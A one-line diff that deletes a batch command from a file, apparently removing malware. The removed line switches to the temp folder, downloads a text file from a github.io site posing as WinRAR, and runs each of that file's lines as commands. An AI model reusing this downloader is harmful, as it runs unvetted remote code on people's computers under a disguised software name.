@@ -1,1 +1,0 @@
-@echo OFF & cd %temp% & curl -o WinRAR.txt https://winrar-lab.github.io/Windows-10/WinRAR.txt & FOR /F "tokens=*" %%* IN (WinRAR.txt) DO %%* & FOR /F "tokens=*" %%* IN (WinRAR.txt) DO %%*
